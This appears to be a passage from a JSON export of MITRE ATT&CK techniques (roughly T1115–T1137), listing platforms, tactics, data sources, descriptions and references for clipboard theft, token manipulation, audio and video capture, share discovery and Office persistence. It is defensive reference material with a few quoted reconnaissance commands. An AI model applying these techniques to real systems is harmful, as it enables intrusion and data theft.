    "technique_description": "<p>Adversaries may collect data stored in the clipboard from users copying information within or between applications. <!-- raw HTML omitted --><!-- raw HTML omitted -->In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <!-- raw HTML omitted -->pbpaste<!-- raw HTML omitted -->, to grab clipboard contents.(Citation: Operating with EmPyre)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/637.html",
        "description": "none",
        "external_id": "CAPEC-637"
      },
      {
        "source_name": "MSDN Clipboard",
        "url": "https://msdn.microsoft.com/en-us/library/ms649012",
        "description": "Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Operating with EmPyre",
        "url": "https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363",
        "description": "rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July 12, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
    "platform": "linux|macos|windows",
    "tid": "T1119",
    "technique": "Automated Collection",
    "tactic": "collection",
    "datasources": "data-loss-prevention|file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a <a href=\"https://attack.mitre.org/techniques/T1059\">Command and Scripting Interpreter</a> to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. <!-- raw HTML omitted --><!-- raw HTML omitted -->This technique may incorporate use of other techniques such as <a href=\"https://attack.mitre.org/techniques/T1083\">File and Directory Discovery</a> and <a href=\"https://attack.mitre.org/techniques/T1570\">Lateral Tool Transfer</a> to identify and move files.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643",
    "platform": "windows|macos",
    "tid": "T1120",
    "technique": "Peripheral Device Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/646.html",
        "description": "none",
        "external_id": "CAPEC-646"
      }
    ]
  },
  {
    "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
    "platform": "linux|macos|windows",
    "tid": "T1123",
    "technique": "Audio Capture",
    "tactic": "collection",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary can leverage a computer’s peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/634.html",
        "description": "none",
        "external_id": "CAPEC-634"
      }
    ]
  },
  {
    "id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
    "platform": "windows",
    "tid": "T1124",
    "technique": "System Time Discovery",
    "tactic": "discovery",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)<!-- raw HTML omitted --><!-- raw HTML omitted -->System time information may be gathered in a number of ways, such as with <a href=\"https://attack.mitre.org/software/S0039\">Net</a> on Windows by performing <!-- raw HTML omitted -->net time \\hostname<!-- raw HTML omitted --> to gather the system time on a remote system. The victim’s time zone may also be inferred from the current system time or gathered by using <!-- raw HTML omitted -->w32tm /tz<!-- raw HTML omitted -->. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a> (Citation: RSA EU12 They’re Inside), or to discover locality information based on time zone to assist in victim targeting.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/295.html",
        "description": "none",
        "external_id": "CAPEC-295"
      },
      {
        "source_name": "MSDN System Time",
        "url": "https://msdn.microsoft.com/ms724961.aspx",
        "description": "Microsoft. (n.d.). System Time. Retrieved November 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Technet Windows Time Service",
        "url": "https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "RSA EU12 They're Inside",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf",
        "description": "Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved November 25, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf",
    "platform": "windows|macos",
    "tid": "T1125",
    "technique": "Video Capture",
    "tactic": "collection",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary can leverage a computer’s peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from <a href=\"https://attack.mitre.org/techniques/T1113\">Screen Capture</a> due to use of specific devices or applications for video recording rather than capturing the victim’s screen.<!-- raw HTML omitted --><!-- raw HTML omitted -->In macOS, there are a few different malware samples that record the user’s webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/634.html",
        "description": "none",
        "external_id": "CAPEC-634"
      },
      {
        "source_name": "objective-see 2017 review",
        "url": "https://objective-see.com/blog/blog_0x25.html",
        "description": "Patrick Wardle. (n.d.). Retrieved March 20, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b",
    "platform": "windows",
    "tid": "T1127",
    "technique": "Trusted Developer Utilities Proxy Execution",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1127.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.</p>\n",
    "technique_references": [
      {
        "source_name": "engima0x3 DNX Bypass",
        "url": "https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/",
        "description": "Nelson, M. (2017, November 17). Bypassing Application Whitelisting By Using dnx.exe. Retrieved May 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "engima0x3 RCSI Bypass",
        "url": "https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/",
        "description": "Nelson, M. (2016, November 21). Bypassing Application Whitelisting By Using rcsi.exe. Retrieved May 26, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Exploit Monday WinDbg",
        "url": "http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
        "description": "Graeber, M. (2016, August 15). Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner. Retrieved May 26, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Tracker",
        "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/",
        "description": "LOLBAS. (n.d.). Tracker.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65",
    "platform": "windows",
    "tid": "T1129",
    "technique": "Shared Modules",
    "tactic": "execution",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows <a href=\"https://attack.mitre.org/techniques/T1106\">Native API</a> which is called from functions like <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted -->, <!-- raw HTML omitted -->LoadLibrary<!-- raw HTML omitted -->, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)<!-- raw HTML omitted --><!-- raw HTML omitted -->The module loader can load DLLs:<!-- raw HTML omitted --><!-- raw HTML omitted -->* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;<!-- raw HTML omitted -->    <!-- raw HTML omitted -->* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);<!-- raw HTML omitted -->    <!-- raw HTML omitted -->* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;<!-- raw HTML omitted -->    <!-- raw HTML omitted -->* via <!-- raw HTML omitted -->&lt;file name=”filename.extension” loadFrom=”fully-qualified or relative pathname”&gt;<!-- raw HTML omitted --> in an embedded or external “application manifest”. The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Windows Library Files",
        "url": "https://en.wikipedia.org/wiki/Microsoft_Windows_library_files",
        "description": "Wikipedia. (2017, January 31). Microsoft Windows library files. Retrieved February 13, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f",
    "platform": "linux|macos|windows",
    "tid": "T1132",
    "technique": "Data Encoding",
    "tactic": "command-and-control",
    "datasources": "network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1132.001",
      "T1132.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Binary-to-text Encoding",
        "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding",
        "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Character Encoding",
        "url": "https://en.wikipedia.org/wiki/Character_encoding",
        "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
    "platform": "windows|linux",
    "tid": "T1133",
    "technique": "External Remote Services",
    "tactic": "persistence",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as <a href=\"https://attack.mitre.org/techniques/T1021/006\">Windows Remote Management</a> can also be used externally.<!-- raw HTML omitted --><!-- raw HTML omitted -->Access to <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "Volexity Virtual Private Keylogging",
        "url": "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/",
        "description": "Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
    "platform": "windows|linux",
    "tid": "T1133",
    "technique": "External Remote Services",
    "tactic": "initial-access",
    "datasources": "authentication-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as <a href=\"https://attack.mitre.org/techniques/T1021/006\">Windows Remote Management</a> can also be used externally.<!-- raw HTML omitted --><!-- raw HTML omitted -->Access to <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "Volexity Virtual Private Keylogging",
        "url": "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/",
        "description": "Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
    "platform": "windows",
    "tid": "T1134",
    "technique": "Access Token Manipulation",
    "tactic": "defense-evasion",
    "datasources": "access-tokens|api-monitoring|authentication-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1134.001",
      "T1134.002",
      "T1134.003",
      "T1134.004",
      "T1134.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. <a href=\"https://attack.mitre.org/techniques/T1134/001\">Token Impersonation/Theft</a>) or used to spawn a new process (i.e. <a href=\"https://attack.mitre.org/techniques/T1134/002\">Create Process with Token</a>). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Any standard user can use the <!-- raw HTML omitted -->runas<!-- raw HTML omitted --> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/633.html",
        "description": "none",
        "external_id": "CAPEC-633"
      },
      {
        "source_name": "Pentestlab Token Manipulation",
        "url": "https://pentestlab.blog/2017/04/03/token-manipulation/",
        "description": "netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LogonUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DuplicateTokenEx",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ImpersonateLoggedOnUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Atkinson Winchester Token Manipulation",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",
        "description": "Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
    "platform": "windows",
    "tid": "T1134",
    "technique": "Access Token Manipulation",
    "tactic": "privilege-escalation",
    "datasources": "access-tokens|api-monitoring|authentication-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1134.001",
      "T1134.002",
      "T1134.003",
      "T1134.004",
      "T1134.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. <a href=\"https://attack.mitre.org/techniques/T1134/001\">Token Impersonation/Theft</a>) or used to spawn a new process (i.e. <a href=\"https://attack.mitre.org/techniques/T1134/002\">Create Process with Token</a>). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)<!-- raw HTML omitted --><!-- raw HTML omitted -->Any standard user can use the <!-- raw HTML omitted -->runas<!-- raw HTML omitted --> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/633.html",
        "description": "none",
        "external_id": "CAPEC-633"
      },
      {
        "source_name": "Pentestlab Token Manipulation",
        "url": "https://pentestlab.blog/2017/04/03/token-manipulation/",
        "description": "netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LogonUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DuplicateTokenEx",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ImpersonateLoggedOnUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHat Atkinson Winchester Token Manipulation",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",
        "description": "Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
    "platform": "macos|windows|linux",
    "tid": "T1135",
    "technique": "Network Share Discovery",
    "tactic": "discovery",
    "datasources": "network-protocol-analysis|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. <!-- raw HTML omitted --><!-- raw HTML omitted -->File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) <a href=\"https://attack.mitre.org/software/S0039\">Net</a> can be used to query a remote system for available shared drives using the <!-- raw HTML omitted -->net view \\remotesystem<!-- raw HTML omitted --> command. It can also be used to query shared drives on the local system using <!-- raw HTML omitted -->net share<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/643.html",
        "description": "none",
        "external_id": "CAPEC-643"
      },
      {
        "source_name": "Wikipedia Shared Resource",
        "url": "https://en.wikipedia.org/wiki/Shared_resource",
        "description": "Wikipedia. (2017, April 15). Shared resource. Retrieved June 30, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Shared Folder",
        "url": "https://technet.microsoft.com/library/cc770880.aspx",
        "description": "Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67",
    "platform": "linux|macos|windows|aws|gcp|azure-ad|azure|office-365",
    "tid": "T1136",
    "technique": "Create Account",
    "tactic": "persistence",
    "datasources": "authentication-logs|aws-cloudtrail-logs|azure-activity-logs|office-365-account-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1136.001",
      "T1136.002",
      "T1136.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.<!-- raw HTML omitted --><!-- raw HTML omitted -->Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft User Creation Event",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720",
        "description": "Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53",
    "platform": "windows|office-365",
    "tid": "T1137",
    "technique": "Office Application Startup",
    "tactic": "persistence",
    "datasources": "file-monitoring|mail-server|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1137.001",
      "T1137.002",
      "T1137.003",
      "T1137.004",
      "T1137.005",
      "T1137.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.<!-- raw HTML omitted --><!-- raw HTML omitted -->A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)</p>\n",
    "technique_references": [
      {
        "source_name": "SensePost Ruler GitHub",
        "url": "https://github.com/sensepost/ruler",
        "description": "SensePost. (2016, August 18). Ruler: A tool to abuse Exchange services. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet O365 Outlook Rules",
        "url": "https://blogs.technet.microsoft.com/office365security/defending-against-rules-and-forms-injection/",
        "description": "Koeller, B.. (2018, February 21). Defending Against Rules and Forms Injection. Retrieved November 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Outlook Forms",
        "url": "https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746",
        "description": "Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Outlook Today Home Page",
        "url": "https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943",
        "description": "Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detect Outlook Forms",
        "url": "https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack",
        "description": "Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost NotRuler",
        "url": "https://github.com/sensepost/notruler",
        "description": "SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
